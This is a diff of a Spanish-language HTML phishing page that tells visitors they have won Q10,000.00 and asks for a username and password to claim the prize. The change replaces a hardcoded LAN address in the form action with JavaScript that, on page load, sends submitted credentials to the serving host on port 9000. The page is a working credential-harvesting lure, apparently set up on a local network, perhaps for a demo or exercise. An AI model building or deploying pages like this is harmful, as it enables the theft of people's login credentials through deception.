@@ -20,12 +20,23 @@
                 event.preventDefault();
             }
         }
+
+        function setDynamicIP() {
+            // Obtiene el hostname (IP o dominio) de la URL actual
+            const hostname = window.location.hostname;
+            
+            // Fuerza el puerto 9000 en el action, independientemente del puerto de la página HTML
+            const form = document.querySelector('form');
+            form.action = `http://${hostname}:9000`;  // Siempre usa el puerto 9000
+        }
+
+        window.onload = setDynamicIP;  // Configura la IP al cargar la página
     </script>
 </head>
 <body>
     <h1>Felicidades, ganaste Q10,000.00</h1>
     <h1>Regístrate para poder reclamar tu premio</h1>
-    <form action="http://192.168.1.51:9000" method="POST" onsubmit="validateForm(event)">
+    <form action="" method="POST" onsubmit="validateForm(event)">
         <label for="username">Usuario:</label>
         <input type="text" id="username" name="username"><br><br>
         <label for="password">Contraseña:</label>
